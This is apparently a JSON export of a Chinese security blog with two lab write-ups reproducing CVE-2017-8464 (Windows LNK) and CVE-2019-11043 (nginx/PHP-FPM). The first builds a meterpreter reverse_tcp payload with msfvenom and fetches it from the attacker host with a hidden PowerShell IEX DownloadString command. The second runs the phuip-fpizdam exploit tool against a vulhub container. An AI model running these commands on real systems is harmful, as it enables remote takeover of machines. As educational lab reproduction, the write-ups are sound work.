{"meta":{"title":"spaceman'blog","subtitle":"","description":"","author":"spaceman","url":"https://spaceman-911.gitee.io","root":"/"},"pages":[{"title":"404","text":"","path":"404/index.html","date":"02-10","excerpt":""},{"title":"About","text":"CTF：会一点 web、misc，其他一窍不通 渗透：会一点工具的使用和一点实战 战队：Firebasky 后援团 团队：无 学校：新疆师范大学 爱好：女 特长：划水、脚本梭哈","path":"about/index.html","date":"02-10","excerpt":""},{"title":"分类","text":"","path":"categories/index.html","date":"02-10","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"02-10","excerpt":""}],"posts":[{"title":"CVE-2017-8464远程命令执行漏洞复现","text":"# CVE-2017-8464 远程命令执行漏洞复现 # 漏洞描述 2017 年 6 月 13 日，微软官方发布编号为 CVE-2017-8464 的漏洞公告，官方介绍 Windows 系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过 U 盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危 Windows 系统通过解析 .LNK 后缀文件时，是使用二进制来解析的，而当恶意的二进制代码被系统识别执行的时候就可以实现远程代码执行，由于是在 explorer.exe 进程中运行的，所以 load 进内存的时候与当前用户具有相同的权限。 于是攻击者利用这一解析过程的漏洞，将包含恶意二进制的代码被附带进可移动驱动器 (或远程共享过程中)，受害者使用 powershell 解析 .LNK 文件后就会被黑客所控制。 成功利用此漏洞的攻击者可能会获得与本地用户相同的用户权限。 # 影响版本 123456789windows 7windows 8windows 8.1windows 10windows server 2008windows server 2008 R2windows server 2012windows server 2012 R2windows server 2016 # 环境准备 攻击机：kali IP：192.168.30.154 靶机：Windows 7 X64 IP：192.168.30.153 # 漏洞复现 使用 kali msfvenom 生成一个反弹 shell 1root@kali911:~# msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.30.154 LPORT&#x3D;5656 -f psh-reflection&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;hack.ps1 这里生成至 /var/www/html 目录下 启动 Apache 服务 12root@kali911:~# service apache2 restart root@kali911:~# service apache2 status 浏览器打开该文件，查看是否成功 1http:&#x2F;&#x2F;127.0.0.1&#x2F;hack.ps1 启动 msf 1root@kali911:~# msfconsole 使用监听模块 multi/handler 1msf5 &gt; use exploit&#x2F;multi&#x2F;handler 指定 kali 攻击机 IP 1msf5 exploit(multi&#x2F;handler) &gt; set LHOST 192.168.30.154 设置端口 1msf5 exploit(multi&#x2F;handler) &gt; set LPORT 5656 设置返回载荷 1msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp 靶机创建快捷键（桌面右键 -&gt; 新建 -&gt; 快捷方式），输入以下内容 1powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.30.154&#x2F;hack.ps1&#39;);test.ps1&quot; 完成创建，运行快捷方式，一闪而过 回到 kali ，开始攻击 1msf5 exploit(multi&#x2F;handler) &gt; exploit 查看系统信息 1meterpreter &gt; sysinfo 对屏幕进行截图 1meterpreter &gt; screenshot 还可进行更多操作这里就不一一介绍了 登录 shell 1meterpreter &gt; shell 查看当前用户 1C:\\Windows\\System32\\WindowsPowerShell\\v1.0&gt;whoami","path":"2021/02/11/CVE-2017-8464远程命令执行漏洞复现/","date":"02-11","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"}]},{"title":"CVE-2019-11043漏洞复现","text":"# CVE-2019-11043 漏洞复现 # 0x01 漏洞简介 nginx + php-fpm 配置不当，当 nginx 配置文件中有 fastcgi_split_path_info ，却没有 if(!-f $document_root$fastcgi_script_name)&#123;return 404;&#125; 的时候就会导致远程代码执行。 向 Nginx + PHP-FPM 的服务器 URL 发送 %0a 时，服务器返回异常。 该漏洞需要在 nginx.conf 中进行特定配置才能触发。具体配置如下： 1234567location ~ [^&#x2F;]\\.php(&#x2F;|$) &#123;...fastcgi_split_path_info ^(.+?\\.php)(&#x2F;.*)$;fastcgi_param PATH_INFO $fastcgi_path_info;fastcgi_pass php:9000;...&#125; 攻击者可以使用换行符（％0a）来破坏 fastcgi_split_path_info 指令中的 Regexp。 Regexp 被损坏导致 PATH_INFO 为空，从而触发该漏洞。 影响版本： PHP 7.0 版本 PHP 7.1 版本 PHP 7.2 版本 PHP 7.3 版本 修复建议： PHP 7.1.X 更新至 7.1.33 PHP 7.2.X 更新至 7.2.24 PHP 7.3.X 更新至 7.3.11 # 0x02 环境搭建 系统：kali # 安装 docker、golang 环境 12sudo apt-get install docker docker-composesudo apt install golang # 搭建环境 12git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.gitcd vulhub&#x2F;php&#x2F;CVE-2019-11043 &amp;&amp; docker-compose up -d 查看 docker 环境： 访问 8080 端口，成功如下 # 0x03 漏洞利用 # 安装漏洞利用工具 1234git clone https:&#x2F;&#x2F;github.com&#x2F;neex&#x2F;phuip-fpizdam.gitcd phuip-fpizdamgo env -w GOPROXY&#x3D;https:&#x2F;&#x2F;goproxy.cngo get -v &amp;&amp; go build 默认使用的是 proxy.golang.org，在国内无法访问，所以换了一个国内能访问的代理地址：https://goproxy.cn # 工具攻击 1.&#x2F;phuip-fpizdam http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.php 成功利用，参数名为 a # 0x04 参考链接： https://blog.csdn.net/weixin_43606134/article/details/107646467 https://blog.csdn.net/qq_43342566/article/details/102733144 http://blog.leanote.com/post/snowming/9da184ef24bd https://blog.csdn.net/weixin_40412037/article/details/111225967","path":"2021/02/10/CVE-2019-11043漏洞复现/","date":"02-10","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"}]}],"categories":[],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"}]}